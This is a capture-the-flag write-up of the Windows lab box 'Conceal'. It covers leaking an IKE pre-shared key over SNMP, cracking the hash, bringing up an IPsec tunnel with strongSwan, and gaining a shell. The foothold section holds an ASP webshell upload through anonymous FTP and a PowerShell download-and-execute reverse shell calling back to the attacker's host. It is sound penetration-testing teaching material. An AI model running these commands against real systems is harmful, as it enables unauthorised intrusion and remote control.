## Overview

Conceal is a hard-difficulty Windows box with an unusual gate: a full TCP scan returns nothing because the Windows firewall blocks all TCP until an IPsec transport-mode security association is established for the connecting host. The only reachable services are over UDP — IKE (ISAKMP) on 500 and SNMP on 161. SNMP runs with the default `public` community and leaks the IKE pre-shared key as an NTLM hash. Cracking it, matching the IKE transform with `ike-scan`, and configuring strongSwan brings the tunnel up; the firewall then drops and ordinary Windows services (FTP, IIS, SMB) appear. Anonymous FTP writes into the IIS upload directory, so an ASP webshell yields code execution and the user flag. This post covers recon through user.

Unusual IPsec-gated box: SNMP leaks the IKE PSK as an NTLM hash and a hand-tuned strongSwan tunnel must be negotiated to unlock TCP, then anon-FTP-to-IIS webshell; contrived gate and custom VPN setup, no CVE.

## Recon

```bash
nmap -p- -T4 --min-rate=1000 10.10.10.116
```

A full TCP scan comes back with **no open ports**. On a Windows host that usually means a firewall, so pivot to UDP.

```bash
nmap -sU -T4 -p1-1000 -sC -sV 10.10.10.116
```

| Port | Service | Notes |
|------|---------|-------|
| 161/udp | SNMP | default `public` community |
| 500/udp | isakmp (IKE) | Microsoft Windows 8, IKEv1 |

The script scan tags 500/udp as IKE with a `Microsoft Windows 8` vendor ID and the usual NAT-T / fragmentation attributes. IKE is the key-exchange protocol for IPsec — the box wants us to build a VPN.

## Enumeration

**SNMP.** Walking SNMP with the default community string immediately hands over a secret:

```bash
snmpwalk -v2c -c public 10.10.10.116
```

One of the description strings reads:

```
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
```

That 32-character hex value is an NTLM hash. It cracks trivially (hashcat mode 1000 / any online cracker):

```bash
hashcat -a 0 -m 1000 9C8B1A372B1878851BE2C097031B6E43 /usr/share/wordlists/rockyou.txt
```

The pre-shared key is `[redacted]`.

**IKE transform.** Before strongSwan can negotiate, we need the exact cipher suite the responder accepts. `ike-scan` returns it:

```bash
ike-scan 10.10.10.116
```

```
Main Mode Handshake returned SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds ...)
```

So: 3DES / SHA1 / DH group 2 (modp1024) / PSK auth, IKEv1. We mirror that exactly in the strongSwan config.

## Foothold

**1 — Configure strongSwan.** Drop the PSK into `/etc/ipsec.secrets`:

```bash
echo '10.10.10.116 : PSK "[redacted]"' >> /etc/ipsec.secrets
```

Then a transport-mode connection in `/etc/ipsec.conf` matching the `ike-scan` transform. Transport mode (not tunnel) because we are only encrypting traffic to this single host, not routing a subnet:

```ini
conn Conceal
    type=transport
    keyexchange=ikev1
    right=10.10.10.116
    authby=psk
    rightprotoport=tcp
    leftprotoport=tcp
    esp=3des-sha1
    ike=3des-sha1-modp1024
    auto=start
```

```bash
ipsec restart
ipsec status
```

The `CHILD_SA Conceal established` message confirms the tunnel is up.

**2 — Re-scan behind the firewall.** With the SA established, TCP traffic is now permitted, so a fresh connect scan finds the real services:

```bash
ports=$(nmap -p- --min-rate=1000 -sT -T4 10.10.10.116 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports -sT 10.10.10.116
```

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | FTP | Microsoft ftpd, **anonymous login allowed** |
| 80/tcp | HTTP | Microsoft IIS 10.0 |
| 135/139/445 | RPC / SMB | standard Windows |

**3 — Map FTP to the web root.** Anonymous FTP lands in an empty directory. Gobuster against IIS finds `/upload` (301), which smells like the FTP drop location. Confirm by uploading a marker:

```bash
echo pwn > exist.asp
ftp 10.10.10.116      # anonymous / any password, then: put exist.asp
curl http://10.10.10.116/upload/exist.asp
```

The response is `pwn` — the FTP directory is served (and executed) by IIS as ASP.

**4 — Upload a webshell.** IIS executes `.asp`, so a command webshell gives us RCE:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -O cmd.asp
ftp 10.10.10.116      # put cmd.asp
```

Browse to `http://10.10.10.116/upload/cmd.asp` and run commands. Upgrade to a proper shell with Nishang's `Invoke-PowerShellTcp.ps1` (append the reverse-shell call, host it, and `iex` it):

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443' >> Invoke-PowerShellTcp.ps1
python3 -m http.server 80
```

```bash
rlwrap nc -lvnp 443
```

Through the webshell:

```
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/Invoke-PowerShellTcp.ps1')
```

A shell returns as `conceal\destitute`.
